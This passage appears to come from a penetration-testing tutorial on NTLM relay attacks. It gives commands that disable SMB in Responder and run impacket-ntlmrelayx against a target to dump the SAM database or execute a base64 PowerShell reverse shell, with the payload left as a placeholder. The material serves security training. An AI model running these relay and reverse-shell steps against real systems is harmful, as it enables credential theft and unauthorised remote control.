
First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).


```ruby
cat /etc/responder/Responder.conf | grep 'SMB ='
```



Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.


```ruby
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```


We can create a PowerShell reverse shell , set our machine IP address, port, and the option Powershell #3 (Base64).


```r
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <reverse shell code>'
```

